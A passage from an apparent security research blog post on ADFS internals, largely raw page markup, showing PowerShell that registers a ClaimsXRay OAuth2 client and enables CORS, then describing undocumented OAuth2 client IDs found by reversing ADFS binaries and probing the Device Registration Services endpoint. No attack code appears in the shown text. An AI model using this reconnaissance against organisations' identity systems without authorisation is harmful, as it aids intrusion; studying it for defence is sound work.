srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*X0aRhXxxinCQrObr3f9UEw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*X0aRhXxxinCQrObr3f9UEw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*X0aRhXxxinCQrObr3f9UEw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*X0aRhXxxinCQrObr3f9UEw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*X0aRhXxxinCQrObr3f9UEw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*X0aRhXxxinCQrObr3f9UEw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X0aRhXxxinCQrObr3f9UEw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*X0aRhXxxinCQrObr3f9UEw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*X0aRhXxxinCQrObr3f9UEw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*X0aRhXxxinCQrObr3f9UEw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*X0aRhXxxinCQrObr3f9UEw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*X0aRhXxxinCQrObr3f9UEw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*X0aRhXxxinCQrObr3f9UEw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*X0aRhXxxinCQrObr3f9UEw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="571" loading="lazy" role="presentation"/></picture></div></div></figure><p id="db6e" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Take note of the <code class="cx ns nt nu nv b">Client Identifier</code> which will be used to identify our client configuration later.</p><p id="e0bf" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The next dialog determines who can access the OAuth2 resource provider. Again we’ll just go with “Permit Everyone” here to allow all authenticated ADFS users to access the application, but there are multiple options to restrict which accounts are permitted access:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb pr"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*OSHEp62ZA5-9oMc8sMhOnw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*OSHEp62ZA5-9oMc8sMhOnw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*OSHEp62ZA5-9oMc8sMhOnw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*OSHEp62ZA5-9oMc8sMhOnw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*OSHEp62ZA5-9oMc8sMhOnw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*OSHEp62ZA5-9oMc8sMhOnw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OSHEp62ZA5-9oMc8sMhOnw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*OSHEp62ZA5-9oMc8sMhOnw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*OSHEp62ZA5-9oMc8sMhOnw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*OSHEp62ZA5-9oMc8sMhOnw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*OSHEp62ZA5-9oMc8sMhOnw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*OSHEp62ZA5-9oMc8sMhOnw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*OSHEp62ZA5-9oMc8sMhOnw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*OSHEp62ZA5-9oMc8sMhOnw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="567" loading="lazy" role="presentation"/></picture></div></div></figure><p id="69d3" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">One additional thing we need to do is configure CORS. This allows ClaimsXRay to make a XHR request to ADFS when exchanging a code for an access token.</p><p id="1661" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">As is often the case with ADFS, there isn’t a management console option to do this and instead we need to use PowerShell:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="9b82" class="pv nx gu nv b bg pw px l py pz">Set-AdfsResponseHeaders -EnableCORS $true<br/>Set-AdfsResponseHeaders -CORSTrustedOrigins https://claimsxray.net</span></pre><p id="07e6" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">On a similar note, if we wanted to create this integration using PowerShell from scratch, we can use:</p><pre class="pd pe pf pg ph ps nv pt bp pu bb bk"><span id="8808" class="pv nx gu nv b bg pw px l py pz">New-AdfsApplicationGroup -Name ClaimsXRayGroup<br/>Add-AdfsNativeClientApplication -Name ClaimsXRayClient -ApplicationGroupIdentifier ClaimsXRayGroup -Identifier https://claimsxray.net/ -RedirectUri https://claimsxray.net/token<br/>Add-AdfsWebApiApplication -Name ClaimsXRayServer -Identifier https://claimsxray.net/ -AllowedClientTypes Public -ApplicationGroupIdentifier ClaimsXRayGroup<br/>Grant-AdfsApplicationPermission -ClientRoleIdentifier https://claimsxray.net/ -ServerRoleIdentifier https://claimsxray.net/ -ScopeNames @(&#x27;email&#x27;, &#x27;openid&#x27;)<br/><br/># Enable CORS support<br/>Set-AdfsResponseHeaders -EnableCORS $true<br/>Set-AdfsResponseHeaders -CORSTrustedOrigins https://claimsxray.net</span></pre><p id="f362" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">And with that we’re done. We can test that things work by kicking off the flow on <a class="af oz" href="http://ClaimsXRay.net" rel="noopener ugc nofollow" target="_blank">ClaimsXRay.net</a>, providing our Client ID that was generated above, as well as the URL’s to our lab ADFS instance:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb pp"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ZQYPcwXjLIcDUdy3ZwcMCw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="368" loading="lazy" role="presentation"/></picture></div></div></figure><p id="e6cd" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">If you click Login, you should see that an access token is returned. We’ll also get an identity token due to the <code class="cx ns nt nu nv b">openid</code> scope requested:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb pp"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*p_MuwlFGbTyhRJHHb657QA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*p_MuwlFGbTyhRJHHb657QA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*p_MuwlFGbTyhRJHHb657QA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*p_MuwlFGbTyhRJHHb657QA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*p_MuwlFGbTyhRJHHb657QA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*p_MuwlFGbTyhRJHHb657QA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*p_MuwlFGbTyhRJHHb657QA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*p_MuwlFGbTyhRJHHb657QA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*p_MuwlFGbTyhRJHHb657QA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*p_MuwlFGbTyhRJHHb657QA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*p_MuwlFGbTyhRJHHb657QA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*p_MuwlFGbTyhRJHHb657QA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*p_MuwlFGbTyhRJHHb657QA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*p_MuwlFGbTyhRJHHb657QA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="338" loading="lazy" role="presentation"/></picture></div></div></figure><p id="cb06" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Now we have some insight into how ADFS handles OAuth2 registration at a very high level, let’s start taking a look at some of the less documented features.</p><h1 id="d663" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">Device Registration Services</h1><p id="86bf" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">While reversing ADFS, I came across a number of “hidden” OAuth2 Client ID’s embedded in the binaries:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qa"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*EWhas06bMfnLsQ6mcxpQPQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*EWhas06bMfnLsQ6mcxpQPQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*EWhas06bMfnLsQ6mcxpQPQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*EWhas06bMfnLsQ6mcxpQPQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*EWhas06bMfnLsQ6mcxpQPQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*EWhas06bMfnLsQ6mcxpQPQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EWhas06bMfnLsQ6mcxpQPQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*EWhas06bMfnLsQ6mcxpQPQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*EWhas06bMfnLsQ6mcxpQPQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*EWhas06bMfnLsQ6mcxpQPQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*EWhas06bMfnLsQ6mcxpQPQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*EWhas06bMfnLsQ6mcxpQPQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*EWhas06bMfnLsQ6mcxpQPQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*EWhas06bMfnLsQ6mcxpQPQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="270" loading="lazy" role="presentation"/></picture></div></div></figure><p id="7873" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">The one that grabbed my attention was <code class="cx ns nt nu nv b">DrsClientIdentitier</code>. If the DRS term looks familiar, it’s likely because you’ve encountered it in the Entra ID world as <a class="af oz" href="https://learn.microsoft.com/en-us/entra/identity/devices/device-registration-how-it-works" rel="noopener ugc nofollow" target="_blank">Device Registration</a>. But for those organisations that like to manage device registration themselves, DRS is also supported on-prem in various forms. Now when I say “supported”, it takes a lot of messing around to get DRS to actually work standalone, so I think it’s been left by Microsoft to die. You are much more likely to encounter this within an organisation which has previously enabled DRS before Entra ID, or as part of the Entra ID Hybrid Join scenarios we’ll explore later.</p><p id="dfbf" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">To enable DRS on ADFS, you use the “Device Registration” feature which will deploy the pre-reqs required to support this in Active Directory:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qb"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*K0nM5HqPcnjIvmD7k3kVpA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*K0nM5HqPcnjIvmD7k3kVpA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*K0nM5HqPcnjIvmD7k3kVpA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*K0nM5HqPcnjIvmD7k3kVpA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*K0nM5HqPcnjIvmD7k3kVpA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*K0nM5HqPcnjIvmD7k3kVpA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*K0nM5HqPcnjIvmD7k3kVpA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*K0nM5HqPcnjIvmD7k3kVpA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*K0nM5HqPcnjIvmD7k3kVpA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*K0nM5HqPcnjIvmD7k3kVpA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*K0nM5HqPcnjIvmD7k3kVpA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*K0nM5HqPcnjIvmD7k3kVpA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*K0nM5HqPcnjIvmD7k3kVpA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*K0nM5HqPcnjIvmD7k3kVpA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="313" loading="lazy" role="presentation"/></picture></div></div></figure><p id="01bb" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">If we query ADFS via the <code class="cx ns nt nu nv b">/EnrollmentServer/contract?api-version=1.2</code> path, we get a list of DRS descriptors:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qc"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*rhvk4KHzlpP6F9FJefj2EA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*rhvk4KHzlpP6F9FJefj2EA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*rhvk4KHzlpP6F9FJefj2EA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*rhvk4KHzlpP6F9FJefj2EA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*rhvk4KHzlpP6F9FJefj2EA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*rhvk4KHzlpP6F9FJefj2EA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rhvk4KHzlpP6F9FJefj2EA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*rhvk4KHzlpP6F9FJefj2EA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*rhvk4KHzlpP6F9FJefj2EA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*rhvk4KHzlpP6F9FJefj2EA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*rhvk4KHzlpP6F9FJefj2EA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*rhvk4KHzlpP6F9FJefj2EA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*rhvk4KHzlpP6F9FJefj2EA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*rhvk4KHzlpP6F9FJefj2EA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="511" loading="lazy" role="presentation"/></picture></div></div></figure><p id="4e39" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">These point to various DRS API services which we will explore later, but before we get too ahead of ourselves, let’s take a quick detour into ADFS authentication methods so we can set the scene for device authentication later on.</p><h1 id="e688" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">Authentication Methods</h1><p id="187a" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">ADFS has a concept of “extranet” and “intranet”. For most organisations, ADFS is exposed on the perimeter via a web proxy, and internal network users typically interact with the ADFS service directly.</p><p id="b630" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">You can see that this split is populated down to the configuration of ADFS, with the endpoints being distinctly listed (in this case as “Enabled” and “Proxy Enabled”, because consistent terminology in Microsoft world is hard):</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qd"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*0M2r8r_7TVua8EDcCbG-mA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*0M2r8r_7TVua8EDcCbG-mA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*0M2r8r_7TVua8EDcCbG-mA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*0M2r8r_7TVua8EDcCbG-mA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*0M2r8r_7TVua8EDcCbG-mA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*0M2r8r_7TVua8EDcCbG-mA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0M2r8r_7TVua8EDcCbG-mA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*0M2r8r_7TVua8EDcCbG-mA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*0M2r8r_7TVua8EDcCbG-mA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*0M2r8r_7TVua8EDcCbG-mA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*0M2r8r_7TVua8EDcCbG-mA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*0M2r8r_7TVua8EDcCbG-mA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*0M2r8r_7TVua8EDcCbG-mA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*0M2r8r_7TVua8EDcCbG-mA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="195" loading="lazy" role="presentation"/></picture></div></div></figure><p id="121e" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This distinction is also surfaced via the authentication methods supported by ADFS, allowing different methods of validating credentials per “Extranet” and “Intranet” (told you Microsoft consistent terminology was hard):</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb qe"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*LfTXeYXRqMU00oC2uN0NSQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*LfTXeYXRqMU00oC2uN0NSQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*LfTXeYXRqMU00oC2uN0NSQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*LfTXeYXRqMU00oC2uN0NSQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*LfTXeYXRqMU00oC2uN0NSQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*LfTXeYXRqMU00oC2uN0NSQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LfTXeYXRqMU00oC2uN0NSQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, 